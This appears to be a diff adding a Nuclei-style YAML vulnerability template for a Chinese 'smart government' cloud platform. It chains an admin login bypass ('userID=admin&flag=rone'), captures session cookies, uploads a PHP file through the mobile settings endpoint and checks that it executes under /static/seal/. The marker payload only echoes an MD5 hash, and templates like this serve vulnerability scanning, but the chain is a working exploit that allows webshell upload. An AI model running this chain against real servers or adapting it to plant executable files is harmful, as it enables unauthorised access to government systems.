@@ -1,0 +1,74 @@
+id: poc-yaml-szt-smart-governmet-setting-upload
+info:
+  name: 数字通云平台智慧政务后台setting 文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 权限绕过
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "{{BaseURL}}/portal/default/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |-
+      userID=admin&flag=rone
+    matchers:
+      - type: status
+        status:
+          - 302
+    extractors:
+      - type: regex
+        name: cookie1
+        internal: true
+        part: header
+        regex:
+          - "GOASESSID=(.*?);"
+      - type: regex
+        name: cookie2
+        internal: true
+        part: header
+        regex:
+          - "(.*?); expires"
+
+  - id: upload
+    method: POST
+    path:
+      - "{{BaseURL}}/sys/mobile/setting"
+    headers:
+      Cookie: "GOASESSID={{cookie1}};{{cookie2}}"
+      Content-Type: multipart/form-data; boundary=---------------------------318638034016337576332132513456
+      X-Requested-With: XMLHttpRequest
+    body: |-
+      -----------------------------318638034016337576332132513456
+      Content-Disposition: form-data; name="MobileApplication[cert]"; filename="{{t1}}.php"
+      Content-Type: application/octet-stream
+
+      <?php echo md5({{t1}});?>
+      -----------------------------318638034016337576332132513456--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "移动应用设置"
+
+  - id: verify
+    method: GET
+    path:
+      - "{{BaseURL}}/static/seal/{{t1}}.php"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
